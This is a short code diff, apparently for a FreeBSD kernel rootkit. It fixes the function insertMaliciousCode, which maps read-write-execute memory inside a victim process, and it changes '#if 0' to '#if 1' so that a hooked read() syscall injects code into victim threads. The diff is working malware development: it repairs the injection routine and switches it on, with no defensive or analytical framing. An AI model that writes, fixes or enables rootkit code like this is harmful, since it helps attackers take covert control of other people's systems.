@@ -75,16 +75,16 @@ insertMaliciousCode (struct thread * td) {
   //
   // Allocate some memory within the victim process.
   //
-  uintptr_t addr = 0;
+  int error;
   struct mmap_args args;
   args.addr = 0;
   args.len = 4096;
   args.prot = PROT_READ | PROT_WRITE | PROT_EXEC;
   args.flags = MAP_ANON;
-  args.fd = 0;
+  args.fd = -1;
   args.pos = 0;
-  addr = sys_mmap (td, &args);
-  printf ("Rootkit: memory at %lx\n", addr);
+  error = sys_mmap (td, &args);
+  printf ("Rootkit: error = %d: memory at %lx\n", error, td->td_retval[0]);
 
   //
   // Mark that we've inserted the malicious code.
@@ -149,7 +149,7 @@ read_hook (struct thread * td, void * syscall_args) {
   // If this is the victim process, and we have not injected code yet,
   // inject the code.
   //
-#if 0
+#if 1
   if (isVictimThread (td))
     insertMaliciousCode (td);
 #endif
